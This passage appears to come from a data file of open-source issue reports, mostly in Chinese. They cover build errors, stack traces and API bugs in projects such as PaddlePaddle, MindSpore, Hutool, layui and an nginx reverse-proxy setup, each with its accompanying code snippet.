org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:860) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
QT 5.14.2 解决mscv中文乱码,直接在工程文件最后面添加   <code>: msvc { QMAKE_CFLAGS += /utf-8 QMAKE_CXXFLAGS += /utf-8 }
I find a bug in ,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
关于远程请求根据客户端名称拦截,"Furion 版本号 v4.8.2.9 .NET SDK 版本号 .NET5 .NET6 .NET7 WebApi Mvc Razor Pages Blazor Server MinApp WinForm WPF Console 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 发生了什么？ 若配置了多个特定名称客户端，要对某一个名称客户端进行全局请求成功/异常拦截，只能通过IF判断BaseAddress来区分是哪个客户端，还有更简便的没呢，既然AddHttpClient设置了名称，在全局拦截里，为啥不能通过配置特性来设置只对本名称的客户端进行拦截吗？ 异常堆栈是什么？ 无 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则将无法得到答复。 Sqlite SqlServer MySQL Oracle PostgreSQL Firebird Cosmos InMemoryDatabase 无   <code>: public interface IHttp : IHttpDispatchProxy { [Get(""?name={name}&amp;idcard={idcard}""),Client(""Verify"")] Task&lt;CheckIdCardRes&gt; GetCheckIdAsync(string name, string idcard); [Get(""/check?idcard={idcard}""), Client(""Verify"")] Task&lt;CheckIdCardRes&gt; GetCheckAsync(string idcard); [Get(""/other/{id}""), Client(""Other"")] Task&lt;CheckIdCardRes&gt; GetOtherAsync(int id); [Interceptor(InterceptorTypes.Exception)] static void OnException(HttpClient client, HttpResponseMessage res, string errors) { if (client.BaseAddress.Host.Contains(""alicloudapi"")) { //Verify请求客户端异常处理 if (res.StatusCode == System.Net.HttpStatusCode.BadRequest) { var errObj = JSON.Deserialize&lt;ReturnMsg&gt;(errors); string msg = ""请求返回异常""; (msg + ""，StatusCode="" + errObj.Msg).LogCritical(); } else { string msg = ""请求接口异常""; (msg + ""，StatusCode="" + res.StatusCode).LogCritical(); } } else if(client.BaseAddress.Host.Contains(""other"")) { //Other请求客户端异常处理 } } }"
Docker 方式启动报错,"报错内容为 连接不到 mysql，但是找不到原因，求助！   <code>: Package manifest generated successfully. 84 packages you are using are looking for funding. Use the `composer fund` command to find out more! Application key set successfully. Illuminate\Database\QueryException SQLSTATE[HY000] [2002] php_network_getaddresses: getaddrinfo failed: Temporary failure in name resolution (SQL: select * from information_schema.tables where table_schema = wookteam and table_name = pre_migrations and table_type = 'BASE TABLE') at vendor/laravel/framework/src/Illuminate/Database/Connection.php:671 667| // If an exception occurs when attempting to run a query, we'll format the error 668| // message to include the bindings with SQL, which will make this exception a 669| // lot more helpful to the developer instead of just the database's errors. 670| catch (Exception $e) { &gt; 671| throw new QueryException( 672| $query, $this-&gt;prepareBindings($bindings), $e 673| ); 674| } 675| +36 vendor frames 37 artisan:37 Illuminate\Foundation\Console\Kernel::handle(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) Stopping wookteam_nginx_1 ... done"
Need to simplify the cmake of inference's unittest,"When we add an inference unittest, we need to add a and to ensure the C++ unittest running after the corresponding Python unittest. https://github.com/PaddlePaddle/Paddle/blob/b41205d9a6b71f26694c2cdb979555c261548629/paddle/inference/tests/book/CMakeLists.txt#L2-L25 It is the same for all unittests, so that we can write a common function to simplify the CMakeLists.txt.   <code>: cc_test set_tests_properties"
运行前端报错：error when starting dev server,"升级 vite 后不报此错 npm install -D vite@3.0.2   <code>: npm run dev &gt; yuebonui-vue3@2.0.0 dev &gt; vite failed to load config from C:\YuebonNetCore\yuebonui-vue3\vite.config.js error when starting dev server: C:\YuebonNetCore\yuebonui-vue3\vite.config.js:1 import { defineConfig, loadEnv } from 'vite' ^^^^^^"
"[CT][MS]subfunc return parameter in if, get wrong result in graph mode","调用带if分支的子函数，返回parameter，construct中有副作用，Ascend图模式计算结果错误 / 硬件环境: /device ascend : -- MindSpore version :commit_id = ''[sha1]:5d03602d,[branch]: -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph python if_func.py 4.0 2.0   <code>: from mindspore.nn import Cell from mindspore.common import Parameter, Tensor, dtype import mindspore.ops.functional as F from mindspore import context class MsFuncIf(Cell): def __init__(self): super().__init__() self.param_a = Parameter(Tensor(1, dtype.float32), name='a') self.param_b = Parameter(Tensor(2, dtype.float32), name='b') self.one = Tensor(1, dtype.float32) def construct(self, x): out = self.one F.assign(self.param_a, 3) out += self.subfunc(x) F.assign(self.param_b, 2) return out def subfunc(self, x): if x &gt; 4: return self.param_a else: return self.param_b def test_auto_monad_load_user_func_if(): #context.set_context(mode=context.PYNATIVE_MODE) msnet = MsFuncIf() msx = Tensor(6, dtype.float32) msout = msnet(msx) print(msout) test_auto_monad_load_user_func_if()"
It's not better to use hard code path!,"https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/inference/api/demo_ci/CMakeLists.txt   <code>: 49 include_directories(""D:/Paddle/"") 50 include_directories(""${PADDLE_LIB}"") 51 include_directories(""${PADDLE_LIB}/third_party/install/protobuf/include"") 52 include_directories(""${PADDLE_LIB}/third_party/install/glog/include"") 53 include_directories(""${PADDLE_LIB}/third_party/install/gflags/include"") 54 if (NOT WIN32) 55 include_directories(""${PADDLE_LIB}/third_party/install/snappy/include"") 56 include_directories(""${PADDLE_LIB}/third_party/install/snappystream/include"") 57 include_directories(""${PADDLE_LIB}/third_party/install/zlib/include"") 58 endif(NOT WIN32) 59 60 include_directories(""${PADDLE_LIB}/third_party/boost"") 61 include_directories(""${PADDLE_LIB}/third_party/eigen3"") 62 63 if (NOT WIN32) 64 link_directories(""${PADDLE_LIB}/third_party/install/snappy/lib"") 65 link_directories(""${PADDLE_LIB}/third_party/install/snappystream/lib"") 66 link_directories(""${PADDLE_LIB}/third_party/install/zlib/lib"") 67 endif(NOT WIN32) 68 69 link_directories(""${PADDLE_LIB}/third_party/install/protobuf/lib"") 70 link_directories(""${PADDLE_LIB}/third_party/install/glog/lib"") 71 link_directories(""${PADDLE_LIB}/third_party/install/gflags/lib"") 72 link_directories(""${PADDLE_LIB}/paddle/fluid/inference"")"
layui table里用templet载入select并把select设为lay-ignore后form.on就失效了。,"版本：layui-v2.7.6 描述：如题，我在table里用templet的方式渲染了一个select表单 #EditUserGroup的模板代码： 然后用form.on去测试，发现失效了。   <code>: {field:'user_group', align:'center', templet:'#EditUserGroup', title: '用户组'} &lt;script type=""text/html"" id=""EditUserGroup""&gt; &lt;select name=""user-group"" lay-filter=""user-group"" data-id=""{{ d.id }}"" lay-ignore&gt; {volist name=""adminUserGroupList"" id=""vo""} &lt;option value=""{$vo.id}""{{# if(d.user_group.id == {$vo.id}){ }} selected=""true""{{# } }}&gt;{$vo.name}&lt;/option&gt; {/volist} &lt;/select&gt; &lt;/script&gt; form.on('select(user-group)',function(data){ alert('ddd'); })"
refine the mkldnn logic,去掉了子类的等类似的函数。在父类实现，子类只负责调用。 稍微修改了下的接口，把放到后面，作为不是必须参数。 创建了文件，把必要的函数实现放在了cpp文件中。 修改了下vlog的顺序，和gtest的参数size加快gtest的速度。   <code>: MKLDNNLayer resetInValue MKLDNNMatrix::create MatrixPtr MKLNNLayer.cpp
http不可以强制直接跳转到https,"通过设置反向代理及负载均衡，可以自动生成如下配置,但该配置如在浏览器中直接键入xxxxx.com会报告The plain HTTP request was sent to HTTPS port。但如果键入https://www.xxxxx.com是可以访问的。 由于浏览器有缓存，假设你之前已经通过https://www.xxxxx.com访问过，后续就不会出现以上报错，您可以通过命令直接访问 curl xxxxx.com，则该问题必现。   <code>: server { server_name www.xxxxx.com xxxxx.com; listen 443 ssl http2; ssl_certificate /home/nginxWebUI/cert/xxxxxx.pem; ssl_certificate_key /home/nginxWebUI/cert/xxxxxxx.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; listen 80; if ($scheme = http) { return 301 https://$host:443$request_uri; } location / { proxy_pass http://web-home; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_redirect http:// https://; } }"
AES加密 补码方式PKCS1Padding字典名称错误,JDK版本： openjdk_8_201 hutool版本： 5.7.2 补码方式PKCS1Padding应该为PKCS7Padding   <code>: Padding.PKCS1Padding
【众智】【计算-GPU开发】Addcdiv,"Performs the element-wise division of tensor x1 by tensor x2, multiply the result by the scalar value and add it to input_data. input_data x1 x2 value y 对应底层算子 Classify Name Type Type Range Required Format INPUT input_data fp16, float, double, int64 TRUE INPUT x1 fp16, float, double, int64 TRUE INPUT x2 fp16, float, double, int64 TRUE INPUT value fp16, float, double, int32, int64 TRUE OUTPUT y fp16, float, double, int64 TRUE 标杆接口参考 PyTorch接口： https://pytorch.org/docs/1.8.1/generated/torch.addcdiv.html?highlight=addcdiv#torch.addcdiv 3. 异常处理 4. 算子反向 参考Pytorch算子反向实现，依赖Conj算子实现。 参考链接： https://github.com/pytorch/pytorch/blob/v1.8.1/tools/autograd/derivatives.yaml 中 addcdiv 的反向算子。   <code>: output = (tensor1 / tensor2) * value + input class Addcdiv(Primitive):"
need to refine the design of DeviceContext,"There are two problems of current DeviceContext design: The base class has a interface called . https://github.com/PaddlePaddle/Paddle/blob/00b64f66794a7b92708147a49cc9ca53f74a7397/paddle/platform/device_context.h#L38-L51 However, Eigen is not supported in all kinds of Device, e.g. AMD Graphics card. It should be moved to derived DeviceContext class. The math functors in operators/math directory take template parameter. https://github.com/PaddlePaddle/Paddle/blob/00b64f66794a7b92708147a49cc9ca53f74a7397/paddle/operators/math/math_function.cu#L24-L45 We have to cast the DeviceContext to CUDADeviceContext even though we have already know we are implementing a CUDA version of the functor. Instead, we'd better to take DeviceContext as the template parameter. At the same time, the template parameter in OpKernel should also be instead of   <code>: DeviceContext GetEigenDevice Place DeviceContext Place"
图片部分识别效果特别差(单独取出效果又还可以),"最近在做文档OCR项目，采用大模型 检测+识别，发现整张图片 2364*3498 jpg图片 丢给模型，中间红框部分效果特差 但是取出来单独识别，效果又还可以(发现同样有漏检情况) 检测的参数调整为： DB后处理参数为: 整体输入图2364*3498 jpg：   <code>: # params for text detector parser.add_argument(""--image_dir"", type=str) parser.add_argument(""--det_algorithm"", type=str, default='DB') parser.add_argument(""--det_model_dir"", type=str, default='./inference/ch_PP-OCRv2_det_infer/') parser.add_argument(""--det_limit_side_len"", type=float, default=1960) parser.add_argument(""--det_limit_type"", type=str, default='max') # DB parmas parser.add_argument(""--det_db_thresh"", type=float, default=0.2) parser.add_argument(""--det_db_box_thresh"", type=float, default=0.1) parser.add_argument(""--det_db_unclip_ratio"", type=float, default=2) parser.add_argument(""--max_batch_size"", type=int, default=10) parser.add_argument(""--use_dilation"", type=str2bool, default=False) parser.add_argument(""--det_db_score_mode"", type=str, default=""fast"")"
在导出预测模型后，使用模型预测报错tensor维度为负,"RuntimeError: In user code:   <code>: File ""tools/export_model.py"", line 256, in &lt;module&gt; main() File ""tools/export_model.py"", line 252, in main model, arch_config, save_path, logger, input_shape=input_shape) File ""tools/export_model.py"", line 172, in export_single_model paddle.jit.save(model, save_path) File ""&lt;decorator-gen-101&gt;"", line 2, in save File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/base.py"", line 51, in __impl__ return func(*args, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/jit.py"", line 744, in save inner_input_spec) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/program_translator.py"", line 517, in concrete_program_specify_input_spec *desired_input_spec) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/program_translator.py"", line 427, in get_concrete_program concrete_program, partial_program_layer = self._program_cache[cache_key] File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/program_translator.py"", line 723, in __getitem__ self._caches[item] = self._build_once(item) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/program_translator.py"", line 714, in _build_once **cache_key.kwargs) File ""&lt;decorator-gen-99&gt;"", line 2, in from_func_spec File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/wrapped_decorator.py"", line 25, in __impl__ return wrapped_func(*args, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/base.py"", line 51, in __impl__ return func(*args, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/program_translator.py"", line 662, in from_func_spec outputs = static_func(*inputs) File ""/tmp/tmpryj05p_e.py"", line 59, in forward final_name, x)) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/convert_operators.py"", line 211, in convert_ifelse out = _run_py_ifelse(pred, true_fn, false_fn, true_args, false_args) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/dygraph_to_static/convert_operators.py"", line 257, in _run_py_ifelse return true_fn(*true_args) if pred else false_fn(*false_args) File ""/data/data/PaddleOCR-release-2.6/ppocr/modeling/architectures/base_model.py"", line 93, in forward x = self.neck(x) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/layers.py"", line 917, in __call__ return self._dygraph_call_func(*inputs, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/dygraph/layers.py"", line 907, in _dygraph_call_func outputs = self.forward(*inputs, **kwargs) File ""/data/data/PaddleOCR-release-2.6/ppocr/modeling/necks/db_fpn.py"", line 284, in forward # PositionAttention File ""/data/data/PaddleOCR-release-2.6/ppocr/modeling/necks/db_fpn.py"", line 245, in channel_attention energy_new = paddle.max(energy, -1, keepdim=True)[0].expand_as(energy) - energy File ""/usr/local/lib/python3.6/dist-packages/paddle/tensor/manipulation.py"", line 1749, in expand_as outputs={'Out': out}) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/framework.py"", line 3184, in append_op attrs=kwargs.get(""attrs"", None)) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/framework.py"", line 2224, in __init__ for frame in traceback.extract_stack(): PreconditionNotMetError: The Tensor's element number must be equal or greater than zero. The Tensor's shape is [-1, 256, 256] now [Hint: Expected numel() &gt;= 0, but received numel():-65536 &lt; 0:0.] (at /paddle/paddle/fluid/framework/tensor.cc:59) [operator &lt; expand_as_v2 &gt; error]"
code review void VtableAnalysis::GenItableDefinition(const Klass *klass),"count 是 itable2 未冲突的 method 计数，那么把 count 存到 itable2 符号表的头部意义是什么？ itable2 size 默认是 kItabSecondHashSize = 8191，那么如果 itable2 大于 8191 如何处理？代码中并没有相关逻辑，如下逻辑都是默认以 8191 计算 <ol start=""3""> 如果 itable2 中也有冲突，那么在 itable2 符号表中添加占位符的意义是什么，这意味着这样的 method 需要索引三次？第一次在 itable1 中查一次，然后在 itable2 中再查一次，如果冲突了，接着查第三次？   <code>: secondItabEmitArray-&gt;GetConstVec().push_back(GetModule()-&gt;GetMemPool()-&gt;New&lt;MIRIntConst&gt;(count, voidPtrType)); for (uint32 i = 0; i &lt; kItabSecondHashSize; i++) { ...... } secondItabEmitArray-&gt;GetConstVec().push_back(GetModule()-&gt;GetMemPool()-&gt;New&lt;MIRIntConst&gt;(i, voidPtrType)); if (secondItab[i]) { secondItabEmitArray-&gt;GetConstVec().push_back(GetModule()-&gt;GetMemPool()-&gt;New&lt;MIRAddroffuncConst(secondItab[i]-&gt;GetPuidx(), voidPtrType)); } else { // it measn it was conflict again in the second hash secondItabEmitArray-&gt;GetConstVec().push_back(oneConst); }"
字符工具-StrUtil.startWith方法参数都为nul问题l,"System.out.println(StrUtil.startWith(null, null, false, true))； 结果应为false，实际为true   <code>: /** * 是否以指定字符串开头&lt;br&gt; * 如果给定的字符串和开头字符串都为null则返回true，否则任意一个值为null返回false * * @param str 被监测字符串 * @param prefix 开头字符串 * @param ignoreCase 是否忽略大小写 * @param ignoreEquals 是否忽略字符串相等的情况 * @return 是否以指定字符串开头 * @since 5.4.3 */ public static boolean startWith(CharSequence str, CharSequence prefix, boolean ignoreCase, boolean ignoreEquals) { if (null == str || null == prefix) { if (false == ignoreEquals) { return false; } return null == str &amp;&amp; null == prefix; }"
未发现自动id生成器: simple,主键 ID 使用了内置的 ID 生成器 。 正如之前有网友提问那样： 同： #I27RJE:org.beetl.sql.clazz.kit.BeetlSQLException: 未发现自动id生成器:simple in test 经测试 - 版本是 ok 的，升级到 就不行了。 如图： size = 0   <code>: simple 未发现自动id生成器:simple 3.6.x 3.9.x 3.10.x idAutoGenMap
help  about  Build PaddlePaddle production image,"I'm new at Paddle or AI I want jion it but ... when Build PaddlePaddle production image use docker run -v $(pwd):/paddle -e ""WITH_GPU=OFF"" -e ""WITH_AVX=OFF"" -e ""WITH_TEST=ON"" paddle:dev I got the Error at and and final . I don't know how to slove... I use command go install google.golang.org/grpc without return and go env has no problem (在制作PaddlePaddle生产镜像的第一步的时候。遇到了一些问题 我确认我的go的环境变量是没有问题的。并且因为墙的原因 我手动安装了google.golang.org/grpc 但是仍然没有任何帮助。仍然提示我 and 我不知道该怎么处理了。谢谢！ )   <code>: [WARN] Unable to checkout golang.org/x/net [ERROR] Update failed for golang.org/x/net: Cannot detect VCS [WARN] Unable to checkout google.golang.org/grpc [ERROR] Update failed for google.golang.org/grpc: Cannot detect VCS [ERROR] Failed to install: Cannot detect VCS [ 19%] Built target extern_mkldnn make: *** [all] Error 2 Makefile:160: recipe for target 'all' failed build over.. [WARN] Unable to checkout golang.org/x/net [ERROR] Update failed for golang.org/x/net: Cannot detect VCS [WARN] Unable to checkout google.golang.org/grpc [ERROR] Update failed for google.golang.org/grpc: Cannot detect VCS [ERROR] Failed to install: Cannot detect VCS"
dynamic_gru错误：TypeError: 'Variable' object is not iterable,"error hints:   <code>: import sys import numpy as np import paddle.v2 as paddle import paddle.fluid as fluid def to_lodtensor(data, place): seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""int64"") flattened_data = flattened_data.reshape([len(flattened_data), 1]) res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) return res def load_vocab(filename): vocab = {} with open(filename) as f: wid = 0 for line in f: vocab[line.strip()] = wid wid += 1 return vocab word_dict = load_vocab(sys.argv[1]) word_dict[""&lt;unk&gt;""] = len(word_dict) #vocabulary size dict_dim = len(word_dict) # embedding dim emb_dim = 128 # hidden dim hid_dim = 128 # hidden dim2 hid_dim2 = 96 # class num class_dim = 2 data = fluid.layers.data( name=""words"", shape=[1], dtype=""int64"", lod_level=1) # label data label = fluid.layers.data(name=""label"", shape=[1], dtype=""int64"") # embedding emb = fluid.layers.embedding(input=data, size=[dict_dim, emb_dim], param_attr=fluid.ParamAttr(learning_rate=5.0)) fc0 = fluid.layers.fc(input=emb, size=emb_dim*3) #gru_h, c = fluid.layers.dynamic_gru(input=fc0, size=hid_dim, is_reverse=False) gru_h, c = fluid.layers.dynamic_gru(input=fc0, size=hid_dim) gru_max = fluid.layers.sequence_pool(input=gru_h, pool_type='max') gru_max_tanh = fluid.layers.tanh(gru_max) fc1 = fluid.layers.fc(input=gru_max_tanh, size=hid_dim2, act='tanh') prediction = fluid.layers.fc(input=fc1, size=class_dim, act='softmax') cost = fluid.layers.cross_entropy(input=prediction, label=label) avg_cost = fluid.layers.mean(x=cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) accuracy = fluid.evaluator.Accuracy(input=prediction, label=label) inference_program = fluid.default_main_program().clone() with fluid.program_guard(inference_program): test_target = accuracy.metrics + accuracy.states inference_program = fluid.io.get_inference_program(test_target) BATCH_SIZE = 4 train_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.train(word_dict), buf_size=25000), batch_size=BATCH_SIZE) test_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.test(word_dict), buf_size=25000), batch_size=BATCH_SIZE) place = fluid.CPUPlace() def test(exe): accuracy.reset(exe) for batch_id, data in enumerate(test_reader()): input_seq = to_lodtensor(map(lambda x:x[0], data), place) y_data = np.array(map(lambda x: x[1], data)).astype(""int64"") y_data = y_data.reshape([-1, 1]) acc = exe.run(inference_program, feed={""words"": input_seq, ""label"": y_data}) return accuracy.eval(exe) exe = fluid.Executor(place) feeder = fluid.DataFeeder(feed_list=[data, label], place=place) exe.run(fluid.default_startup_program()) PASS_NUM = 30 for pass_id in xrange(PASS_NUM): accuracy.reset(exe) for data in train_reader(): cost_val, acc_val = exe.run(fluid.default_main_program(), feed=feeder.feed(data), fetch_list=[avg_cost, accuracy.metrics[0]]) pass_acc = accuracy.eval(exe) pass_test_acc = test(exe) print(""test_acc: %f"" % pass_test_acc) Traceback (most recent call last): File ""scripts/test_gru_maxpooling.py"", line 55, in &lt;module&gt; gru_h, c = fluid.layers.dynamic_gru(input=fc0, size=hid_dim) TypeError: 'Variable' object is not iterable"
monitor 监控 服务状态显示不正确,"环境信息 pigx版本: v4.2 是否修改包名: 否 提供详细   <code>: # 暴露监控端点 management: endpoints: web: exposure: include: ""*"" endpoint: health: show-details: ALWAYS"
[ST][MS/modelzoo][NET][TPRR][ascend910]acc is smaller than standard,"精度劣化 问题commitid：ac72a96d (20220614211828) ok_commit_id:3232a15b (20220513181541) / 硬件环境: /device Ascend/ : -- MindSpore version :r1.7.0 B120 commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_moddel_zoo_tprr_ascend_infer_8p_0001 get code from models sh run_distribute_train_gpu.sh 推理精度达标 备注 提给安正气   <code>: rootaNGqU6IB: INFO: Retriever infer cost time is 4.33840106692579 hours rootaNGqU6IB: INFO: Retriever infer acc PEM is 0.030253916801728797 rootaNGqU6IB: INFO: Retriever infer acc truePEM is 0.0525328330206379 rootaNGqU6IB: INFO: Reranker infer cost time is 1.580318544043435 hours rootaNGqU6IB: INFO: Reranker infer acc PEM is 0.004051316677920324 rootaNGqU6IB: INFO: Reranker infer acc joint F1 is 4.344069165136012 rootaNGqU6IB: ERROR: Retriever infer acc PEM is 3.03, it smaller than 93.5 rootaNGqU6IB: ERROR: Retriever infer acc truePEM is 5.25, it smaller than 97.5 rootaNGqU6IB: ERROR: Reranker infer acc PEM is 0.41, it smaller than 87.5"
mindspore.nn.SoftmaxCrossEntropyWithLogits问题,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 在pytorch实现的hrnet网络中需要传入weight进行计算loss。 weight = torch.FloatTensor([0.8373, 0.918, 0.866, 1.0345, 1.0166, 0.9969, 0.9754, 1.0489, 0.8786, 1.0023, 0.9539, 0.9843, 1.1116, 0.9037, 1.0865, 1.0955, 1.0865, 1.1529, 1.0507]).cuda() import torch import torch.nn as nn from torch.nn import functional as F import cv2 class CrossEntropy(nn.Module): def init(self, ignore_label=-1, weight=None): super(CrossEntropy, self).init() self.ignore_label = ignore_label self.criterion = nn.CrossEntropyLoss(weight=weight, ignore_index=ignore_label) def forward(self, score, target): ph, pw = score.size(2), score.size(3) h, w = target.size(1), target.size(2) if ph != h or pw != w: score = F.upsample( input=score, size=(h, w), mode='bilinear') 但是，在mindspore中的交叉熵损失函数缺乏weight属性。可见，下图图片对比： classmindspore.nn.SoftmaxCrossEntropyWithLogits(sparse=False, reduction='none') 3.参考如下方式，可以传入weight,但只能保证weight为1，实现不了上述的需求，而且繁琐。 class SoftmaxCrossEntropyLoss(nn.Cell): def init(self, num_cls=21, ignore_label=255): super(SoftmaxCrossEntropyLoss, self).init() self.one_hot = P.OneHot(axis=-1) self.on_value = Tensor(1.0, mstype.float32) self.off_value = Tensor(0.0, mstype.float32) self.cast = P.Cast() self.ce = nn.SoftmaxCrossEntropyWithLogits() self.not_equal = P.NotEqual() self.num_cls = num_cls self.ignore_label = ignore_label self.mul = P.Mul() self.sum = P.ReduceSum(False) self.div = P.RealDiv() self.transpose = P.Transpose() self.reshape = P.Reshape() def construct(self, logits, labels): labels_int = self.cast(labels, mstype.int32) labels_int = self.reshape(labels_int, (-1,)) logits_ = self.transpose(logits, (0, 2, 3, 1)) logits_ = self.reshape(logits_, (-1, self.num_cls)) weights = self.not_equal(labels_int, self.ignore_label) weights = self.cast(weights, mstype.float32) one_hot_labels = self.one_hot(labels_int, self.num_cls, self.on_value, self.off_value) loss = self.ce(logits_, one_hot_labels) loss = self.mul(weights, loss) loss = self.div(self.sum(loss), self.sum(weights)) return loss 希望可以参照pytorch中的交叉熵损失函数，增加weight参数，让其更灵活一些。   <code>: loss = self.criterion(score, target) return loss"
Remove not used params in GradientMachine::start,Remove all unused parameters in . Make this method easily exposed in SWIG.   <code>: GradientMachine::start
